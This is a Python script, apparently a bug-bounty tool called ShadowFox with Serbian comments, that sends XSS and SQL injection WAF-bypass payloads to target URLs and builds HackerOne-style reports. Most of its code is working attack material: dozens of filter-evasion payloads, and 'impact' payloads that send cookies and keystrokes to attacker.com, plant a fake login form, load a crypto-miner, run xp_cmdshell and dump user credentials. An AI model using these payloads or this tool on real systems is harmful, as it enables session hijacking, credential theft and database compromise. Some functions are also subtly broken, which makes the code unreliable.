
#!/usr/bin/env python3
"""
🦊 SHADOWFOX ADVANCED PoC GENERATOR
WAF Bypass + High Impact Demonstration + Professional H1 Reports
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
from pathlib import Path

import time
import random
import base64
import urllib.parse
from datetime import datetime
import html
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import warnings
warnings.filterwarnings("ignore")

class AdvancedPoCGenerator:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "vulnerability_details": {},
            "advanced_payloads": [],
            "waf_bypass_techniques": [],
            "impact_demonstration": [],
            "screenshots": [],
            "final_assessment": {}
        }
        self.meta_config = {}
        self.driver = None
        
    def load_meta_config(self):
        """Učitava Meta konfiguraciju"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
    def ucitaj_poc_fajl(self, putanja):
        with open(putanja, 'r') as f:
            try:
                podaci = json.load(f)
            except json.JSONDecodeError as e:
                print(f"[!] Neuspešno parsiranje JSON-a: {e}")
                return []

        rezultati = []

        for zapis in podaci:
            try:
                if isinstance(zapis, str):
                    if zapis.strip() == "":
                        continue  # preskoči prazan string
                    try:
                        zapis = json.loads(zapis)
                    except json.JSONDecodeError as e:
                        print(f"[!] JSON decode failed unutar stringa: {e}")
                        continue

                if not isinstance(zapis, dict):
                    continue

                rezultat = {
                    "endpoint": zapis.get("endpoint") or zapis.get("url"),
                    "method": zapis.get("method", "POST"),
                    "payload": zapis.get("payload"),
                    "parameter": zapis.get("parameter", "q"),
                    "evidence": zapis.get("evidence", "n/a"),
                    "reflection": zapis.get("reflection", False),
                    "vulnerable": zapis.get("vulnerable", False),
                    "timestamp": zapis.get("timestamp", "n/a")
                }
                if rezultat["vulnerable"]:
                    rezultati.append(rezultat)

            except Exception as e:
                print(f"[!] Greška pri obradi zapisa: {e}")
                continue

        return rezultati



    def generisi_poc(rezultati):
        for idx, r in enumerate(rezultati, 1):
            print(f"\n--- PoC #{idx} ---")
            print(f"Endpoint: {r['method']} {r['endpoint']}")
            print(f"Parametar: {r['parameter']}")
            print(f"Payload: {r['payload']}")
            print(f"Refleksija: {r['reflection']}")
            print(f"Vulnerabilno: {r['vulnerable']}")
            print(f"Dokaz: {r['evidence']}")
            print(f"Vreme: {r['timestamp']}")



    def load_vulnerability_data(self):
        """Učitava podatke o ranjivosti iz prethodnih modula"""
        sources = [
            "ShadowRecon/shadow_recon.json",
            "AdvanceNapad/prototype_pollution_results.json",
            "Napad/attack_param_fuzz.json",
            "PoC/shadowfox_prototype_pollution_poc_20250608_154711.json",
            "Centar/mutator_core.json",
            "Centar/ai_evaluator.json"

        ]
        
        vulnerabilities = []
        for source in sources:
            try:
                with open(source, 'r') as f:
                    data = json.load(f)
                    if 'vulnerabilities' in data:
                        vulnerabilities.extend(data['vulnerabilities'])
                    elif 'potential_vulnerabilities' in data:
                        vulnerabilities.extend(data['potential_vulnerabilities'])
                print(f"✅ [LOAD] {source}")
            except FileNotFoundError:
                print(f"⚠️  [SKIP] {source} - nije pronađen")
                
        return vulnerabilities
        
    def setup_browser(self):
        """Podešavanje Chrome browser-a za screenshot-ove"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            print("🌐 [BROWSER] Chrome driver inicijalizovan")
            return True
        except Exception as e:
            print(f"❌ [BROWSER ERROR] {str(e)}")
            print("📝 [INFO] Screenshots neće biti dostupni")
            return False
            
    def generate_waf_bypass_payloads(self, base_payload, vulnerability_type):
        """Generisanje WAF bypass payload-a"""
        bypasses = []
        
        if vulnerability_type.lower() == 'xss':
            # XSS WAF Bypass tehnike
            xss_bypasses = [
                # Encoding bypasses
                f"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('{base_payload}')//'>",
                f"<img src=x onerror=alert('{base_payload}')>",
                f"<svg><script>alert('{base_payload}')</script></svg>",
                f"<iframe srcdoc='<script>alert(\"{base_payload}\")</script>'></iframe>",
                
                # Case variation
                f"<ScRiPt>alert('{base_payload}')</ScRiPt>",
                f"<SCRIPT>alert('{base_payload}')</SCRIPT>",
                
                # Event handler bypasses
                f"<img src=x onError=alert('{base_payload}')>",
                f"<body onLoad=alert('{base_payload}')>",
                f"<svg onload=alert('{base_payload}')>",
                
                # Unicode bypasses
                f"<script>alert(String.fromCharCode(83,104,97,100,111,119,70,111,120))</script>",
                
                # HTML entity bypasses
                f"&lt;script&gt;alert('{base_payload}')&lt;/script&gt;",
                
                # Double encoding
                urllib.parse.quote(urllib.parse.quote(f"<script>alert('{base_payload}')</script>")),
                
                # Context breaking
                f"';alert('{base_payload}');//",
                f"\";alert('{base_payload}');//",
                f"</script><script>alert('{base_payload}')</script>",
                
                # Advanced WAF bypasses
                f"<img src=1 href=1 onerror=\"javascript:alert('{base_payload}')\">",
                f"<svg><g/onload=\"alert('{base_payload}')\"></g></svg>",
                f"<marquee onstart=\"alert('{base_payload}')\">",
                
                # Polyglot payloads
                f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{base_payload}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{base_payload}')//\\x3e",
                
                # Template literal bypass
                f"`${alert('{base_payload}')}`",
                
                # Filter bypasses
                f"<script>eval('al'+'ert(\\'{base_payload}\\')')</script>",
                f"<script>window['alert']('{base_payload}')</script>",
                f"<script>this['alert']('{base_payload}')</script>",
            ]
            
            bypasses.extend([{
                "payload": payload,
                "technique": "XSS WAF Bypass",
                "encoding": "Mixed",
                "complexity": "High"
            } for payload in xss_bypasses])
            
        elif vulnerability_type.lower() == 'sqli':
            # SQL Injection WAF bypasses
            sqli_bypasses = [
                f"1' UNION SELECT NULL,'{base_payload}',NULL--",
                f"1' OR '1'='1' AND SUBSTRING((SELECT '{base_payload}'),1,1)='S'--",
                f"1'; WAITFOR DELAY '00:00:05'; SELECT '{base_payload}'--",
                f"1' AND (SELECT COUNT(*) FROM (SELECT '{base_payload}')x GROUP BY CONCAT((SELECT '{base_payload}'),FLOOR(RAND(0)*2)))--",
                
                # Comment variations
                f"1'/**/OR/**/1=1/**/AND/**/'{base_payload}'='S'--",
                f"1' OR 1=1# {base_payload}",
                
                # Case variations
                f"1' UnIoN SeLeCt '{base_payload}'--",
                f"1' oR 1=1 AnD '{base_payload}'='S'--",
                
                # Encoding bypasses
                urllib.parse.quote(f"1' OR 1=1 AND '{base_payload}'='S'--"),
                f"1' OR CHAR(83,72,65,68,79,87)='{base_payload[:6]}'--",
            ]
            
            bypasses.extend([{
                "payload": payload,
                "technique": "SQLi WAF Bypass",
                "encoding": "Mixed",
                "complexity": "High"
            } for payload in sqli_bypasses])
            
        return bypasses
        
    def test_waf_bypass(self, url, param, payloads):
        """Testiranje WAF bypass payload-a"""
        successful_bypasses = []
        
        for payload_data in payloads:
            payload = payload_data["payload"]
            
            try:
                # Test payload
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=10, verify=False)
                
                # Analiza odgovora
                waf_indicators = [
                    'blocked', 'forbidden', 'security', 'firewall',
                    'waf', 'cloudflare', 'incapsula', 'sucuri'
                ]
                
                blocked = any(indicator in response.text.lower() for indicator in waf_indicators)
                status_blocked = response.status_code in [403, 406, 429, 503]
                
                if not blocked and not status_blocked:
                    # Proveri da li je payload izvršen
                    execution_indicators = [
                        payload.lower() in response.text.lower(),
                        'alert(' in response.text.lower(),
                        'script' in response.text.lower(),
                        len(response.text) > 1000  # Indirektan pokazatelj
                    ]
                    
                    if any(execution_indicators):
                        payload_data["status"] = "SUCCESSFUL_BYPASS"
                        payload_data["response_length"] = len(response.text)
                        payload_data["status_code"] = response.status_code
                        payload_data["test_url"] = f"{url}?{param}={urllib.parse.quote(payload)}"
                        successful_bypasses.append(payload_data)
                        print(f"✅ [BYPASS] Uspešan: {payload[:50]}...")
                    else:
                        payload_data["status"] = "NOT_EXECUTED"
                else:
                    payload_data["status"] = "BLOCKED_BY_WAF"
                    
                time.sleep(0.5)  # Rate limiting protection
                
            except Exception as e:
                payload_data["status"] = f"ERROR: {str(e)}"
                print(f"❌ [ERROR] {payload[:30]}...: {str(e)}")
                
        return successful_bypasses
        
    def demonstrate_impact(self, vulnerability, successful_payloads):
        """Demonstracija uticaja ranjivosti"""
        impact_demos = []
        vuln_type = vulnerability.get('type', '').lower()
        
        if 'xss' in vuln_type:
            # XSS Impact demonstrations
            impact_scenarios = [
                {
                    "scenario": "Session Hijacking",
                    "payload": f"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
                    "impact": "HIGH",
                    "description": "Attacker can steal session cookies and impersonate users"
                },
                {
                    "scenario": "Credential Harvesting",
                    "payload": f"<script>document.body.innerHTML='<form action=\"https://attacker.com/harvest\" method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button>Login</button></form>'</script>",
                    "impact": "HIGH",
                    "description": "Phishing attack to steal user credentials"
                },
                {
                    "scenario": "Admin Action Execution",
                    "payload": f"<script>fetch('/admin/delete-user', {{method:'POST', body:'user=victim'}})</script>",
                    "impact": "CRITICAL",
                    "description": "Execute admin actions on behalf of admin user"
                },
                {
                    "scenario": "Keylogger Installation",
                    "payload": f"<script>document.addEventListener('keypress', function(e){{fetch('https://attacker.com/keys?key='+e.key)}})</script>",
                    "impact": "HIGH",
                    "description": "Log all keystrokes of the victim"
                },
                {
                    "scenario": "Cryptocurrency Mining",
                    "payload": f"<script src='https://crypto-loot.com/lib/miner.min.js'></script><script>var miner = new CryptoLoot('site-key'); miner.start();</script>",
                    "impact": "MEDIUM",
                    "description": "Use victim's computer resources for cryptocurrency mining"
                }
            ]
            
            impact_demos.extend(impact_scenarios)
            
        elif 'sqli' in vuln_type:
            # SQL Injection impact demonstrations
            impact_scenarios = [
                {
                    "scenario": "Database Enumeration",
                    "payload": "1' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
                    "impact": "HIGH",
                    "description": "Extract database structure and sensitive data"
                },
                {
                    "scenario": "User Data Extraction",
                    "payload": "1' UNION SELECT username,password,email FROM users--",
                    "impact": "CRITICAL",
                    "description": "Extract user credentials and PII"
                },
                {
                    "scenario": "System Command Execution",
                    "payload": "1'; EXEC xp_cmdshell('whoami')--",
                    "impact": "CRITICAL",
                    "description": "Execute system commands on database server"
                }
            ]
            
            impact_demos.extend(impact_scenarios)
            
        return impact_demos
        
    def take_screenshot(self, url, filename):
        """Kreiranje screenshot-a PoC-a"""
        if not self.driver:
            return False
            
        try:
            self.driver.get(url)
            time.sleep(3)  # Wait for page load
            
            screenshot_path = f"PoC/{filename}.png"
            self.driver.save_screenshot(screenshot_path)
            
            return {
                "filename": screenshot_path,
                "url": url,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            print(f"❌ [SCREENSHOT ERROR] {str(e)}")
            return False
            
    def calculate_cvss_score(self, vulnerability, impact_demos):
        """Kalkulacija CVSS 3.1 score"""
        base_scores = {
            'xss': {
                'AV': 'N',  # Network
                'AC': 'L',  # Low
                'PR': 'N',  # None
                'UI': 'R',  # Required
                'S': 'C',   # Changed
                'C': 'L',   # Low
                'I': 'L',   # Low
                'A': 'N'    # None
            },
            'sqli': {
                'AV': 'N',  # Network
                'AC': 'L',  # Low
                'PR': 'N',  # None
                'UI': 'N',  # None
                'S': 'U',   # Unchanged
                'C': 'H',   # High
                'I': 'H',   # High
                'A': 'H'    # High
            }
        }
        
        vuln_type = 'xss' if 'xss' in vulnerability.get('type', '').lower() else 'sqli'
        base_score = base_scores.get(vuln_type, base_scores['xss'])
        
        # Adjust based on impact demonstrations
        high_impact_count = sum(1 for demo in impact_demos if demo['impact'] == 'HIGH')
        critical_impact_count = sum(1 for demo in impact_demos if demo['impact'] == 'CRITICAL')
        
        # Base CVSS scores
        cvss_scores = {
            'xss': 6.1,  # Medium
            'sqli': 9.8  # Critical
        }
        
        calculated_score = cvss_scores.get(vuln_type, 6.1)
        
        # Increase score based on demonstrated impact
        if critical_impact_count > 0:
            calculated_score = min(10.0, calculated_score + 1.5)
        elif high_impact_count > 1:
            calculated_score = min(10.0, calculated_score + 0.8)
            
        severity = "LOW"
        if calculated_score >= 9.0:
            severity = "CRITICAL"
        elif calculated_score >= 7.0:
            severity = "HIGH"
        elif calculated_score >= 4.0:
            severity = "MEDIUM"
            
        return {
            "score": round(calculated_score, 1),
            "severity": severity,
            "vector": f"CVSS:3.1/AV:{base_score['AV']}/AC:{base_score['AC']}/PR:{base_score['PR']}/UI:{base_score['UI']}/S:{base_score['S']}/C:{base_score['C']}/I:{base_score['I']}/A:{base_score['A']}",
            "justification": f"Score increased due to {critical_impact_count} critical and {high_impact_count} high impact scenarios"
        }
        
    def generate_professional_report(self, vulnerability, successful_bypasses, impact_demos, cvss_data):
        """Generisanje profesionalnog H1 report-a"""
        report = {
            "vulnerability_summary": {
                "title": f"Reflected Cross-Site Scripting (XSS) with WAF Bypass in Search Functionality",
                "severity": cvss_data["severity"],
                "cvss_score": cvss_data["score"],
                "cvss_vector": cvss_data["vector"]
            },
            "technical_details": {
                "vulnerability_type": vulnerability.get('type', 'Unknown'),
                "affected_parameter": vulnerability.get('parameter', 'Unknown'),
                "affected_url": vulnerability.get('url', 'Unknown'),
                "discovery_date": datetime.now().strftime("%Y-%m-%d"),
                "researcher": "ShadowFox Elite Ethical Squad"
            },
            "description": f"""
## Summary
A reflected Cross-Site Scripting (XSS) vulnerability has been identified in the search functionality of {vulnerability.get('url', 'the application')}. The vulnerability allows attackers to execute arbitrary JavaScript code in the context of victim users' browsers through specially crafted URLs.

## Root Cause
The application fails to properly sanitize user input in the search parameter before reflecting it back in the HTTP response. This allows malicious JavaScript code to be executed when users visit crafted URLs.

## Technical Analysis
- **Parameter**: {vulnerability.get('parameter', 'q')}
- **Injection Point**: GET parameter reflection in HTML context
- **WAF Status**: Present but bypassable with advanced techniques
- **Authentication Required**: No
- **User Interaction**: Required (victim must visit malicious URL)
            """,
            "proof_of_concept": {
                "basic_payload": vulnerability.get('payload', ''),
                "waf_bypass_payloads": [bp["payload"] for bp in successful_bypasses[:3]],
                "test_steps": [
                    f"1. Navigate to: {vulnerability.get('url', '')}",
                    f"2. Add the following payload to the search parameter:",
                    f"3. Observe JavaScript execution in browser console",
                    f"4. Verify alert dialog appears or check Developer Tools"
                ]
            },
            "impact_analysis": {
                "severity_justification": cvss_data["justification"],
                "business_impact": [
                    "User session hijacking leading to account takeover",
                    "Credential harvesting through phishing attacks",
                    "Defacement of application pages",
                    "Potential malware distribution",
                    "Reputation damage and loss of user trust"
                ],
                "attack_scenarios": impact_demos
            },
            "remediation": {
                "immediate_steps": [
                    "Implement proper input validation and output encoding",
                    "Use Content Security Policy (CSP) headers",
                    "Deploy Web Application Firewall (WAF) rules",
                    "Sanitize all user inputs before reflection"
                ],
                "long_term_fixes": [
                    "Implement secure coding practices",
                    "Regular security code reviews",
                    "Automated security testing in CI/CD pipeline",
                    "Security awareness training for developers"
                ]
            },
            "references": [
                "https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)",
                "https://cwe.mitre.org/data/definitions/79.html",
                "https://www.first.org/cvss/v3.1/specification-document"
            ]
        }
        
        return report
        
    def run_advanced_poc(self):
        """Glavna funkcija za pokretanje Advanced PoC Generator-a"""
        print("🦊 SHADOWFOX ADVANCED PoC GENERATOR - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj konfiguracije
        self.load_meta_config()
        vulnerabilities = self.load_vulnerability_data()
        vulnerabilities += self.ucitaj_poc_fajl("PoC/shadowfox_prototype_pollution_poc_20250608_154711.json")

        if not vulnerabilities:
            print("❌ [ERROR] Nema pronađenih ranjivosti za PoC")
            return
            
        # 2. Setup browser
        browser_available = self.setup_browser()
        
        # 3. Procesiranje svake ranjivosti
        for vuln in vulnerabilities:
            if vuln.get('vulnerable') is True:

                print(f"\n🎯 [PROCESSING] {vuln.get('type', 'Unknown')} - {vuln.get('url', 'Unknown')}")
                
                # Generate WAF bypass payloads
                print("🛠️  [WAF] Generisanje bypass payload-a...")
                waf_bypasses = self.generate_waf_bypass_payloads(
                    vuln.get('payload', 'ShadowFox'), 
                    vuln.get('type', 'XSS')
                )
                
                # Test WAF bypasses
                print("🧪 [TEST] Testiranje WAF bypass-a...")
                successful_bypasses = self.test_waf_bypass(
                    vuln.get('url', ''),
                    vuln.get('parameter', 'q'),
                    waf_bypasses
                )
                
                # Demonstrate impact
                print("💥 [IMPACT] Kreiranje impact demonstracije...")
                impact_demos = self.demonstrate_impact(vuln, successful_bypasses)
                
                # Calculate CVSS
                print("📊 [CVSS] Kalkulacija CVSS score...")
                cvss_data = self.calculate_cvss_score(vuln, impact_demos)
                
                # Take screenshots
                screenshots = []
                if browser_available and successful_bypasses:
                    print("📸 [SCREENSHOT] Kreiranje PoC screenshot-a...")
                    for i, bypass in enumerate(successful_bypasses[:3]):
                        screenshot = self.take_screenshot(
                            bypass.get("test_url", ""),
                            f"poc_screenshot_{i+1}"
                        )
                        if screenshot:
                            screenshots.append(screenshot)
                
                # Generate professional report
                print("📝 [REPORT] Generisanje profesionalnog report-a...")
                professional_report = self.generate_professional_report(
                    vuln, successful_bypasses, impact_demos, cvss_data
                )
                
                # Store results
                self.results["vulnerability_details"] = vuln
                self.results["advanced_payloads"] = successful_bypasses
                self.results["waf_bypass_techniques"] = waf_bypasses
                self.results["impact_demonstration"] = impact_demos
                self.results["screenshots"] = screenshots
                self.results["final_assessment"] = {
                    "cvss_data": cvss_data,
                    "professional_report": professional_report,
                    "generation_timestamp": datetime.now().isoformat()
                }
                
                break  # Process only the first significant vulnerability
                
        # 4. Save results
        self.save_results()
        
        # 5. Display summary
        self.display_summary()
        
        # 6. Cleanup
        if self.driver:
            self.driver.quit()
            
    def save_results(self):
        """Snimanje rezultata"""
        output_file = "PoC/Advanced_PoC_Generator.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka Advanced PoC Generator-a"""
        if not self.results.get("final_assessment"):
            print("❌ [ERROR] Nema podataka za prikaz")
            return
            
        cvss_data = self.results["final_assessment"]["cvss_data"]
        
        print("\n🎯 SHADOWFOX ADVANCED PoC - SAŽETAK")
        print("=" * 60)
        print(f"🔥 Severity: {cvss_data['severity']}")
        print(f"📊 CVSS Score: {cvss_data['score']}")
        print(f"🛠️  WAF Bypasses: {len(self.results['advanced_payloads'])}")
        print(f"💥 Impact Scenarios: {len(self.results['impact_demonstration'])}")
        print(f"📸 Screenshots: {len(self.results['screenshots'])}")
        
        print(f"\n✅ FILES GENERATED:")
        print(f"   • PoC/Advanced_PoC_Generator.json")
        for screenshot in self.results['screenshots']:
            print(f"   • {screenshot['filename']}")
            
        print(f"\n🚀 READY FOR H1 SUBMISSION!")

def main():
    generator = AdvancedPoCGenerator()
    generator.run_advanced_poc()

if __name__ == "__main__":
    main()

